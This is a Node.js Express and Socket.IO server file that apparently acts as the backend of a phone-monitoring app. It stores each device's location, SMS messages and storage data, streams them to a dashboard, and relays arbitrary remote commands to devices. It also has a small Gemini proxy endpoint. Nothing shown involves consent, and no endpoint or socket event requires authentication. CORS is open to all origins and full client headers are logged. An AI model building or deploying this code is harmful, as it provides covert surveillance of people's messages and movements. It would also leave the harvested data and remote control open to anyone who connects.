require('dotenv').config();
const { PredictionServiceClient } = require('@google-cloud/aiplatform').v1;
const client = new PredictionServiceClient();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const path = require('path');

const app = express();
const cors = require('cors');
app.use(cors());
app.use(express.json());

// Add logging middleware
app.use((req, res, next) => {
    console.log(`${req.method} ${req.url}`);
    next();
});

app.use(express.static('../dashboard'));

// Root route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../dashboard/index.html'));
});

// Gemini API call using Vertex AI
async function callGeminiAPI(prompt) {
    try {
        const project = 'third-octagon-474305-k9';
        const location = 'us-central1';
        const endpoint = `projects/${project}/locations/${location}/publishers/google/models/gemini-1.0-pro`;
        const request = {
            endpoint,
            instances: [{ content: prompt }],
            parameters: { maxOutputTokens: 512 }
        };
        const [response] = await client.predict(request);
        // Return the first prediction text if available
        if (response && response.predictions && response.predictions.length > 0) {
            return { generated_text: response.predictions[0].content || JSON.stringify(response.predictions[0]) };
        }
        return { generated_text: JSON.stringify(response) };
    } catch (error) {
        console.error('Gemini API call failed:', error.message);
        throw error;
    }
}

// API endpoint for AI generation
app.post('/api/ai/generate', async (req, res) => {
    const { prompt } = req.body;
    if (!prompt) {
        return res.status(400).json({ error: 'Prompt is required' });
    }
    try {
        const aiResponse = await callGeminiAPI(prompt);
        res.json(aiResponse);
    } catch (err) {
        res.status(500).json({ error: 'Failed to get response from Gemini' });
    }
});

// Existing endpoints
const dataFile = 'data.json';

// Endpoint to get all data for initial load
app.get('/data', (req, res) => {
    const allData = JSON.parse(fs.readFileSync(dataFile));
    res.json(allData);
});

// Endpoint for dashboard initial load
app.get('/api/devices', (req, res) => {
    const allData = JSON.parse(fs.readFileSync(dataFile));
    const devices = Object.keys(allData).map(deviceId => {
        const entries = allData[deviceId];
        const latest = entries.length > 0 ? entries[entries.length - 1] : null;
        return { deviceId, latest: latest ? { ...latest.location, ts: latest.timestamp } : null };
    });
    res.json({ devices });
});

const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

const deviceSockets = {}; // Map deviceId to array of socket ids

// Initialize data file if not exists
if (!fs.existsSync(dataFile)) {
    fs.writeFileSync(dataFile, JSON.stringify({}));
}

io.on('connection', (socket) => {
    console.log('=== SOCKET CONNECTION DEBUG ===');
    console.log('Client connected:', socket.id);
    console.log('Client IP:', socket.handshake.address);
    console.log('Client headers:', socket.handshake.headers);
    console.log('Transport:', socket.conn.transport.name);
    console.log('================================');

    let deviceId = null;

    // Register device on connection
    socket.on('register', (id) => {
        deviceId = id;
        if (!deviceSockets[deviceId]) deviceSockets[deviceId] = [];
        deviceSockets[deviceId].push(socket.id);
        io.emit('deviceOnline', { deviceId });
        console.log(`Device ${deviceId} registered with socket ${socket.id}`);
    });

    // Handle data from app
    socket.on('data', (data) => {
        const { deviceId: dataDeviceId, location, sms, storage } = data;
        const allData = JSON.parse(fs.readFileSync(dataFile));
        if (!allData[dataDeviceId]) allData[dataDeviceId] = [];
        const timestamp = new Date().toISOString();
        allData[dataDeviceId].push({ timestamp, location, sms, storage });
        fs.writeFileSync(dataFile, JSON.stringify(allData, null, 2));
        io.emit('deviceLocation', { deviceId: dataDeviceId, payload: { ...location, ts: timestamp } });
        sms.forEach(s => io.emit('deviceSms', { deviceId: dataDeviceId, payload: { ...s, ts: timestamp } }));
        io.emit('deviceStorage', { deviceId: dataDeviceId, payload: { ...storage, ts: timestamp } });
        io.emit('dataUpdate', allData);
    });

    // Handle command from dashboard
    socket.on('command', (data) => {
        const { deviceId: targetDeviceId, command } = data;
        if (deviceSockets[targetDeviceId]) {
            deviceSockets[targetDeviceId].forEach(sid => {
                if (io.sockets.sockets.get(sid)) {
                    io.to(sid).emit('command', { deviceId: targetDeviceId, command });
                }
            });
            console.log(`Command ${command} sent to device ${targetDeviceId}`);
        } else {
            console.log(`No socket found for device ${targetDeviceId}`);
        }
    });

    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        if (deviceId && deviceSockets[deviceId]) {
            deviceSockets[deviceId] = deviceSockets[deviceId].filter(sid => sid !== socket.id);
            if (deviceSockets[deviceId].length === 0) {
                delete deviceSockets[deviceId];
                io.emit('deviceOffline', { deviceId });
            }
        }
    });
});

const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('=== SERVER STARTUP DEBUG ===');
    console.log(`Server running on http://0.0.0.0:${PORT}`);
    console.log(`Local access: http://localhost:${PORT}`);
    console.log(`Network access: http://0.0.0.0:${PORT}`);
    console.log(`Socket.IO ready for connections`);
    console.log('============================');
});

// Add error handling for server startup
server.on('error', (err) => {
    console.error('=== SERVER ERROR ===');
    console.error('Server failed to start:', err);
    console.error('Port may be in use or permission denied');
    console.error('===================');
});
